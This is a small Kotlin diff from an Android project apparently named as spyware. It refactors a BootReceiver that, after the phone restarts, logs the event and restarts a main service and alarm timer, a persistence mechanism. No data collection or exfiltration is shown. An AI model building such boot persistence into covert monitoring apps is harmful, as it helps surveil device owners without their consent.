@@ -4,7 +4,9 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
+import android.os.Message
 import com.example.spyware.common.Constants
+import com.example.spyware.common.Constants.Companion.MESSAGE
 import log
 import org.json.JSONObject
 
@@ -13,7 +15,7 @@ class BootReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent?) {
         if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
-            log(context,JSONObject().put("message","Phone restarted"))
+            log(context,JSONObject().put(MESSAGE,"Phone restarted"))
             val serviceIntent = Intent(context, MainService::class.java)
             alarmManger= AlarmManger(context)
             alarmManger.start(Constants.timerSeconds*1000)
